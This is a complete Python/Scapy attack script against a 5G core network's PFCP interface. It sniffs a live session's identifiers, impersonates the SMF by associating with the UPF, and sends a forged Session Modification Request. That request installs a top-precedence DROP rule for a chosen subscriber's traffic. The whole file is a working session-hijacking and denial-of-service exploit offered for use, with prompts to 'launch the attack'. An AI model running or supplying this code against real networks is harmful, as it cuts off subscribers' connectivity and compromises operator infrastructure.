# smf_dynamic_spoof_v6_final.py
import re
import socket
import struct
import time
import os
from threading import Thread, Event
from scapy.all import *

# --- USER CONFIGURATION ---
KALI_INTERFACE = "eth0"      # Or "ens33", etc.
KALI_IP = "192.168.37.131"   # Attacker's IP
TARGET_UE_IP = "10.45.0.9"   # The IP of the UE to attack
PFCP_PORT = 8805

# --- Global Flags & Data Store ---
ASSOCIATION_SUCCESSFUL = Event()
STOP_THREAD = Event()
RECON_DATA = {}

def reconnaissance_handler(pkt):
    """
    Sniffs for a PFCP Session Establishment Response to extract all necessary data.
    """
    global RECON_DATA
    if pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt[UDP].dport == PFCP_PORT:
        raw_pfcp = pkt[Raw].load
        if raw_pfcp[0] == 0x21 and raw_pfcp[1] == 0x33: # Session Establishment Response
            print("[+] Detected PFCP Session Establishment Response. Extracting data...")
            try:
                fseid_ie_pattern = re.compile(b'\x00\x39' + b'.' * 2 + b'.(.{8})') # Type 57
                match = fseid_ie_pattern.search(raw_pfcp)
                if not match: return
                upf_seid = int.from_bytes(match.group(1), 'big')

                # Find F-TEID in the *Created PDR* IE. This is more reliable.
                created_pdr_pattern = re.compile(b'\x00\x08' + b'.' * 2 + b'.*?' + b'\x00\x15' + b'.' * 2 + b'.(.{4})(.{4})', re.DOTALL)
                fteid_match = created_pdr_pattern.search(raw_pfcp)
                if not fteid_match: return
                teid_bytes, gnb_ip_bytes = fteid_match.groups()

                RECON_DATA['upf_ip'] = pkt[IP].src
                RECON_DATA['victim_teid'] = int.from_bytes(teid_bytes, 'big')
                RECON_DATA['victim_gnb_ip'] = socket.inet_ntoa(gnb_ip_bytes)
                RECON_DATA['upf_seid'] = upf_seid
                print("[+] Reconnaissance complete!")
                return True
            except Exception as e:
                print(f"[!] Error during packet parsing: {e}")
    return False

def pfcp_response_handler(pkt, target_upf_ip):
    """ Handles responses from the UPF after we initiate contact. """
    if not (pkt.haslayer(UDP) and pkt[IP].src == target_upf_ip and pkt.haslayer(Raw)): return
    payload = pkt[Raw].load
    message_type = payload[1]

    if message_type == 6 and not ASSOCIATION_SUCCESSFUL.is_set():
        if b'\x00\x13\x00\x01\x01' in payload:
            print("[+] SUCCESS: PFCP Association confirmed by UPF.")
            ASSOCIATION_SUCCESSFUL.set()
    elif message_type == 1:
        seq_num_bytes = payload[4:8]
        ie_recovery_ts = b"\x00\x60\x00\x04" + struct.pack('!I', int(time.time()))
        response_header = b"\x20\x02" + struct.pack('!H', len(ie_recovery_ts) + 4) + seq_num_bytes
        response_packet = IP(src=KALI_IP, dst=target_upf_ip)/UDP(sport=PFCP_PORT, dport=PFCP_PORT)/Raw(load=response_header + ie_recovery_ts)
        send(response_packet, verbose=0, iface=KALI_INTERFACE)

def send_pfcp_modification_request(target_upf_ip, victim_teid, victim_gnb_ip, upf_seid):
    """
    Crafts and sends the final, correct PFCP Session Modification Request.
    """
    print(f"[*] Sending final MODIFICATION rule for IP {TARGET_UE_IP} using UPF SEID {hex(upf_seid)}...")

    pdr_id = b"\x00\x38\x00\x02" + (100).to_bytes(2, 'big') # PDR ID 100
    precedence = b"\x00\x1d\x00\x04" + (1).to_bytes(4, 'big') # Precedence 1 (highest)
    
    # --- THIS IS THE FIX ---
    # Source Interface must be "Access" (0) to match traffic from the gNB.
    pdi_source_if = b"\x00\x14\x00\x01\x00"
    
    # F-TEID flags: V4=1, V6=0 -> 0x81
    pdi_fteid = b"\x00\x15" + struct.pack('!H', 9) + b"\x81" + victim_teid.to_bytes(4, 'big') + socket.inet_aton(victim_gnb_ip)
    pdi_ue_ip = b"\x00\x5d" + struct.pack('!H', 5) + b"\x02" + socket.inet_aton(TARGET_UE_IP)
    pdi_body = pdi_source_if + pdi_fteid + pdi_ue_ip
    pdi = b"\x00\x02" + struct.pack('!H', len(pdi_body)) + pdi_body
    
    far_id_val = 100
    far_id_ie = b"\x00\x6c\x00\x04" + far_id_val.to_bytes(4, 'big') # FAR ID 100
    
    apply_action_drop = b"\x00\x2c\x00\x01\x01" # Action: DROP
    create_far_body = far_id_ie + apply_action_drop
    create_far = b"\x00\x03" + struct.pack('!H', len(create_far_body)) + create_far_body

    create_pdr_body = pdr_id + precedence + pdi + far_id_ie
    create_pdr = b"\x00\x01" + struct.pack('!H', len(create_pdr_body)) + create_pdr_body

    payload_ies = create_pdr + create_far

    seq_num = 3
    header = b"\x21\x34" + struct.pack('!H', len(payload_ies) + 12) + struct.pack('!Q', upf_seid) + seq_num.to_bytes(3, 'big') + b'\x00'
    packet = IP(src=KALI_IP, dst=target_upf_ip)/UDP(sport=PFCP_PORT, dport=PFCP_PORT)/Raw(load=header + payload_ies)

    send(packet, verbose=0, iface=KALI_INTERFACE)

def main():
    print(f"[*] SMF Dynamic Spoof Initialized on interface '{KALI_INTERFACE}'")
    print("[*] Phase 1: Sniffing for a UE session to hijack...")
    sniff(iface=KALI_INTERFACE, filter=f"udp and port {PFCP_PORT}", stop_filter=reconnaissance_handler, store=0)

    if not RECON_DATA or 'upf_seid' not in RECON_DATA:
        print("[!] Failed to capture complete session info. Aborting.")
        return

    target_upf_ip = RECON_DATA["upf_ip"]
    victim_teid = RECON_DATA["victim_teid"]
    victim_gnb_ip = RECON_DATA["victim_gnb_ip"]
    upf_seid = RECON_DATA["upf_seid"]

    print("\n--- Reconnaissance Data Extracted ---")
    print(f"  - Target UPF IP:   {target_upf_ip}")
    print(f"  - Victim gNB IP:   {victim_gnb_ip}")
    print(f"  - Victim TEID:     {hex(victim_teid)}")
    print(f"  - Target UPF SEID: {hex(upf_seid)}")
    print("------------------------------------\n")

    handler_thread = Thread(target=sniff, kwargs={'iface': KALI_INTERFACE, 'filter': f"udp and src host {target_upf_ip} and port {PFCP_PORT}", 'prn': lambda pkt: pfcp_response_handler(pkt, target_upf_ip), 'store': 0, 'stop_filter': lambda p: STOP_THREAD.is_set()})
    handler_thread.daemon = True
    handler_thread.start()

    print("--- Phase 2: Attempting PFCP Association with UPF ---")
    ie_node_id = b"\x00\x3c\x00\x05\x00" + socket.inet_aton(KALI_IP)
    ie_recovery_ts = b"\x00\x60\x00\x04" + struct.pack('!I', int(time.time()))
    assoc_payload = ie_node_id + ie_recovery_ts
    assoc_header = b"\x20\x05" + struct.pack('!H', len(assoc_payload) + 4) + b"\x00\x00\x00\x01"
    assoc_packet = IP(src=KALI_IP, dst=target_upf_ip)/UDP(sport=PFCP_PORT, dport=PFCP_PORT)/Raw(load=assoc_header + assoc_payload)
    send(assoc_packet, verbose=0, iface=KALI_INTERFACE)

    if not ASSOCIATION_SUCCESSFUL.wait(timeout=5):
        print("\n[!] PHASE 2 FAILED. No association response from UPF. Aborting.")
        STOP_THREAD.set()
        return

    print("\n--- Phase 3: Ready to Hijack Legitimate UE Session ---")
    input("[?] Press Enter to send the malicious MODIFICATION rule and launch the attack...")
    send_pfcp_modification_request(target_upf_ip, victim_teid, victim_gnb_ip, upf_seid)

    print("\n[***] ATTACK SENT! The UE's connection should now be failing. [***]")
    print("      Press Ctrl+C to terminate.")
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down.")
    finally:
        STOP_THREAD.set()
        handler_thread.join(timeout=2)
        print("[*] Script finished.")

if __name__ == "__main__":
    main()